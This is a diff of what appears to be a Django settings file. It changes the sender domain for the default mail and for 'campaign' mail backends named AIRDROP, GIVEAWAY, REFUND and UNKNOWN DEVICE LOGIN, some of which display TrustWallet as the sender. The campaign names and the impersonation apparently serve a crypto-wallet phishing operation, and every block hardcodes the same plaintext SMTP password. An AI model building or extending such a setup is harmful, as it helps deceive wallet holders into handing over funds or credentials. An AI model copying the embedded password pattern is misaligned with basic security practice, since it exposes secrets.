@@ -151,16 +151,16 @@ EMAIL_HOST = 'smtp.hostinger.com'
 EMAIL_PORT = 465
 EMAIL_USE_TLS = False
 EMAIL_USE_SSL = True
-EMAIL_HOST_USER = 'support@coindistribution.site'
+EMAIL_HOST_USER = 'support@prowebcheck.online'
 EMAIL_HOST_PASSWORD = 'Arinze123.'
-DEFAULT_FROM_EMAIL = 'Emirex Tools <support@coindistribution.site>'
+DEFAULT_FROM_EMAIL = 'Emirex Tools <support@prowebcheck.online>'
 EMAIL_TIMEOUT = 60
 
 CAMPAIGN_EMAIL_BACKENDS = {
     'AIRDROP': {
         'EMAIL_HOST': 'smtp.hostinger.com',
         'EMAIL_PORT': 465,
-        'EMAIL_HOST_USER': 'Airdrop Update support@coindistribution.site',
+        'EMAIL_HOST_USER': 'Airdrop Update support@prowebcheck.online',
         'EMAIL_HOST_PASSWORD': 'Arinze123.',
         'EMAIL_USE_TLS': False,
         'EMAIL_USE_SSL': True,
@@ -169,7 +169,7 @@ CAMPAIGN_EMAIL_BACKENDS = {
     'GIVEAWAY': {
         'EMAIL_HOST': 'smtp.hostinger.com',
         'EMAIL_PORT': 465,
-        'EMAIL_HOST_USER': 'TrustWallet support@coindistribution.site',
+        'EMAIL_HOST_USER': 'TrustWallet support@prowebcheck.online',
         'EMAIL_HOST_PASSWORD': 'Arinze123.',
         'EMAIL_USE_TLS': False,
         'EMAIL_USE_SSL': True,
@@ -178,7 +178,7 @@ CAMPAIGN_EMAIL_BACKENDS = {
     'REFUND': {
         'EMAIL_HOST': 'smtp.hostinger.com',
         'EMAIL_PORT': 465,
-        'EMAIL_HOST_USER': 'TrustWallet support@coindistribution.site', # Replace with your Gmail address
+        'EMAIL_HOST_USER': 'TrustWallet support@prowebcheck.online', # Replace with your Gmail address
         'EMAIL_HOST_PASSWORD': 'Arinze123.',
         'EMAIL_USE_TLS': False,
         'EMAIL_USE_SSL': True,
@@ -187,7 +187,7 @@ CAMPAIGN_EMAIL_BACKENDS = {
     'UNKNOWN DEVICE LOGIN': {
         'EMAIL_HOST': 'smtp.hostinger.com',
         'EMAIL_PORT': 587,
-        'EMAIL_HOST_USER': 'support@coindistribution.site',
+        'EMAIL_HOST_USER': 'support@prowebcheck.online',
         'EMAIL_HOST_PASSWORD': 'Arinze123.',
         'EMAIL_USE_TLS': True,
         'EMAIL_TIMEOUT': 60
